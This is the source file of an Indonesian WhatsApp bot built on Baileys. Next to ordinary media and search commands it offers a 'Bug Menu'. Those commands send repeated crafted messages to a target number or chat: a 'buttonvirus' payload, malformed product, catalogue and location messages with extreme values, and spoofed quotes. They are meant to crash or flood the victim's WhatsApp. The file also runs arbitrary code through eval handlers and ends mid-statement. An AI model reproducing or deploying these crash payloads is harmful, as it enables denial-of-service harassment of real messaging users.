const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const yts = require('./scrape/yt-search')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'Creator Kayla'
global.ownerNumber = ["6287705048235@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Owner Bot`s Special Features!!!',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}

module.exports = kayla = async (kayla, kaylabotwhatsapp, chatUpdate, store) => {
try {
        const body = (kaylabotwhatsapp.mtype === 'conversation') ? kaylabotwhatsapp.message.conversation : (kaylabotwhatsapp.mtype == 'imageMessage') ? kaylabotwhatsapp.message.imageMessage.caption : (kaylabotwhatsapp.mtype == 'videoMessage') ? kaylabotwhatsapp.message.videoMessage.caption : (kaylabotwhatsapp.mtype == 'extendedTextMessage') ? kaylabotwhatsapp.message.extendedTextMessage.text : (kaylabotwhatsapp.mtype == 'buttonsResponseMessage') ? kaylabotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (kaylabotwhatsapp.mtype == 'listResponseMessage') ? kaylabotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (kaylabotwhatsapp.mtype == 'templateButtonReplyMessage') ? kaylabotwhatsapp.message.templateButtonReplyMessage.selectedId : (kaylabotwhatsapp.mtype === 'messageContextInfo') ? (kaylabotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || kaylabotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || kaylabotwhatsapp.text) : ''
        const budy = (typeof kaylabotwhatsapp.text == 'string' ? kaylabotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®�????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®�????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(kaylabotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = kaylabotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = kaylabotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = kaylabotwhatsapp.pushName || "No Name"
        const botNumber = await kayla.decodeJid(kayla.user.id)
        const itsMeKayla = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(kaylabotwhatsapp.sender)
        const itsMe = kaylabotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = kaylabotwhatsapp.quoted ? kaylabotwhatsapp.quoted : kaylabotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = kaylabotwhatsapp.isGroup ? (kaylabotwhatsapp.key.participant ? kaylabotwhatsapp.key.participant : kaylabotwhatsapp.participant) : kaylabotwhatsapp.key.remoteJid
        const groupMetadata = kaylabotwhatsapp.isGroup ? await kayla.groupMetadata(kaylabotwhatsapp.chat).catch(e => {}) : ''
        const groupName = kaylabotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = kaylabotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = kaylabotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = kaylabotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = kaylabotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = kaylabotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = kaylabotwhatsapp.isGroup ? groupAdmins.includes(kaylabotwhatsapp.sender) : false
    	const isAdmins = kaylabotwhatsapp.isGroup ? groupAdmins.includes(kaylabotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[kaylabotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[kaylabotwhatsapp.sender] = {}
const chats = global.db.chats[kaylabotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[kaylabotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!kayla.public) {
if (!kaylabotwhatsapp.key.fromMe) return
}

if (!kaylabotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(kaylabotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (kaylabotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(kaylabotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (kaylabotwhatsapp.sender.startsWith('212')) return kayla.updateBlockStatus(kaylabotwhatsapp.sender, 'block')

try {
ppuser = await kayla.profilePictureUrl(kaylabotwhatsapp.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
kayla.sendPresenceUpdate('composing', from)
kayla.readMessages([kaylabotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return kayla.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `Kayla`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return kayla.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

switch (command) {
case 'menu':
const botzkayla = "6287705048235@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykayla = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `Hai Kak @${sender.split("@")[0]} 
Saya Kayla Makasih Udah Gunain Bot Nya Jangan Spam Yah Kak. Dan Berikut Di Bawah List Menu Nya Kak :v

   Other Menu
${prefix}setppbot
${prefix}owner
${prefix}cecan
${prefix}obfus (kode js)
${prefix}styletext (teks)
${prefix}attp (teks)
${prefix}tourl (kirim/reply media)
${prefix}toimg (reply sticker)
${prefix}sticker (kirim/reply image/video/gifs)
${prefix}ytsearch (judul lagu)
${prefix}play (judul lagu)
${prefix}mp3 (link yt)
${prefix}mp4 (link yt)

   Bug Menu
${prefix}kaystick (Private/Group)
${prefix}kayteks (Private/Group)
${prefix}kayitem (Private/Group)
${prefix}kaylog (Private/Group)
${prefix}kaykontak (Private/Group)
${prefix}kayloc (Private/Group)
${prefix}kayvn (Private/Group)
${prefix}stickgas (Private)
${prefix}itemgas (Private)
${prefix}cataloggas (Private)

Thanks To
Allah SWT
Nabi Muhammad SAW
Orang Tua
Kayla Bot`
let buttons = [
{buttonId: `${prefix}owner`, buttonText: {displayText: 'O  W  N  E  R  /  C  R  E  A  T  O  R'}, type: 1}
]
let buttonMessage = {
document: ppnyauser, 
fileName: `Bot By Kayla`, 
mimetype: `application/${bykayla}`,
jpegThumbnail: ppnyauser,
caption: mbc,
fileLength: "99999999999",
mentions: [sender, botzkayla],
footer: `_Powered By @${botzkayla.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, botzkayla],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}
}
kayla.sendMessage(from, buttonMessage, { quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`,
				   remoteJid: "6281903153426-1626053991@g.us"
				  },
				  message: {
		documentMessage: {
		title: `Created By Kayla`,
		jpegThumbnail: ppnyauser
				   }
				  }
				 }, detectLink: true })
break
case 'cewek': case 'cecan': {
var yeye = await fetchJson("https://kirbotz-api.herokuapp.com/api/random/cecan?apikey=KirBotz") 
kayla.sendMessage(from,{image:{url:yeye.result.url},caption: `${mess.succes}`}, { quoted: kaylabotwhatsapp } )
}
break
case 'attp':
if (args.length == 0) return kaylabotwhatsapp.reply(`Contoh: ${prefix + command} Hai`)
gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
kayla.sendMessage(from, { sticker: gehdhe, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'}}}, { quoted: kaylabotwhatsapp })
break
case 'tiktok': case 'tiktoknowm':{
if (!q) return kaylabotwhatsapp.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let res = await tiktok(q)
kayla.sendMessage(from,{video:{url:res.nowm},caption: `${mess.succes}`}, { quoted: kaylabotwhatsapp } )
}
break
case 'search':
case 'ytsearch':
if (args.length < 1) return kaylabotwhatsapp.reply(`Contoh:\n${command} bukti Virgoun`)
let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const button = {
title: `Hasil Pencarian Dari ${q}`,
description: "Silahkan Tap Tombol Dibawah",
footerText: `Created By Kayla`,
buttonText: 'Tap Disini',
listType: 'SINGLE_SELECT',
sections: [
{
title: "Hasil Pencarian", 
rows: list_rows
}
]
}
const templateList = generateWAMessageFromContent(from, proto.Message.fromObject({ "listMessage": button }), {});
kayla.relayMessage(from, templateList.message, { messageId: templateList.key.id });
break
case 'play':{
if (!text) return kaylabotwhatsapp.reply(`Example : ${prefix+command} story wa anime`)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '6287705048235'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}`
let buttonse = [
{buttonId: `${prefix}mp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `${prefix}mp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Spam Yah`, 
"mediaType": 2, 
"thumbnail": eek,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}
}
kayla.sendMessage(from, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Kayla',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'mp3': {
let { yta } = require('./lib/yt')
if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return kaylabotwhatsapp.reply('File Melebihi Batas '+util.format(media))
kayla.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Lupa Bilang Makasih`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}}, { quoted: kaylabotwhatsapp })
}
break
case 'mp4': {
let { ytv } = require('./lib/yt')
if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
kayla.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `? Title : ${media.title}\n? File Size : ${media.filesizeF}\n? Url : ${isUrl(text)}\n? Ext : MP4\n? Resolusi : ${args[1] || '360p'}`, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Lupa Bilang Makasih`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}}, { quoted: kaylabotwhatsapp })
}
break
case 'setppbot': {
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
if (!quoted) return kaylabotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return kaylabotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return kaylabotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await kayla.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
var { img } = await generateProfilePicture(medis)
await kayla.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
kaylabotwhatsapp.reply(`Sukses`)
} else {
var memeg = await kayla.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
kaylabotwhatsapp.reply(`Sukses`)
}
}
break
case 'tourl':
let media = await kayla.downloadAndSaveMediaMessage(quoted)
if (( isMedia ) && args.length == 0) {
let anu = await uptotelegra(media)
kaylabotwhatsapp.reply(util.format(anu))
}
break
case 'toimg': {
if (!quoted) return kaylabotwhatsapp.reply('Reply Image')
if (!/webp/.test(mime)) return kaylabotwhatsapp.reply(`balas stiker dengan caption *${command}*`)
let media = await kayla.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kayla.sendMessage(from, { image: buffer, jpegThumbnail: ppnyauser, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"jpegThumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'}}}, { quoted: kaylabotwhatsapp })
fs.unlinkSync(ran)
})
}
break
case 'sticker': 
case 's': {
global.packname = `\n\n\n\n\n\n\n\n\n\nSticker By : ${pushname}\n\n\n\n\n\n\n\n\n\n`
global.author = `\n\n\n\n\n\n\n\n\n\nThanks Kayla Bot\n\n\n\n\n\n\n\n\n\n`
if (!quoted) return kaylabotwhatsapp.reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kayla.sendImageAsSticker(from, media, kaylabotwhatsapp, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return kaylabotwhatsapp.reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await kayla.sendVideoAsSticker(from, media, kaylabotwhatsapp, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
kaylabotwhatsapp.reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'obfus':{
if (!q) return kaylabotwhatsapp.reply(`Contoh ${command} const kirbotz = require('kirbotz-api')`)
let meg = await obfus(q)
kaylabotwhatsapp.reply(`Sukses
${meg.result}`)
}
break
case 'styletext':{
if (!q) return kaylabotwhatsapp.reply(`Contoh ${command} akira`)
let res = await styletext(q)
kaylabotwhatsapp.reply(util.format(res))
}
break
case 'stickgas':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
if (!q) return kaylabotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'itemgas': {
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
if (!q) return kaylabotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, 'Hallo Kak', 'Aku KirBotz', 'Minta Donasi Nya Donk Kak', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'cataloggas': {
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
if (!q) return kaylabotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes Doank`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
kayla.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kaylog':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes Doank`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
kayla.relayMessage(from, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kayloc':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": "yt KirBotz`",
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": "hai aku Kayla",
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: from, quoted: lep })
kayla.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kaykontak':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
kayla.sendContact(from, owner, lep)
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kayitem':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(from, 'Hallo Kak', 'Aku Kayla', 'Lihat Donk Dalem Nya', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kaystick':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kayvn':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[kaylabotwhatsapp.sender]}, { quoted: lep })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'kayteks':{
if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(from, {text: "Hai Aku Kayla"},{ quoted: lep })
await sleep(ms(waktu))
}
kaylabotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'owner':{
kayla.sendContact(kaylabotwhatsapp.chat, owner, kaylabotwhatsapp)
}
break
default:
}
if (budy.startsWith('=>')) {
if (!itsMeKayla) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return kaylabotwhatsapp.reply(bang)
}
try {
kaylabotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
kaylabotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMeKayla) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await kaylabotwhatsapp.reply(evaled)
} catch (err) {
kaylabotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMeKayla) return
try {
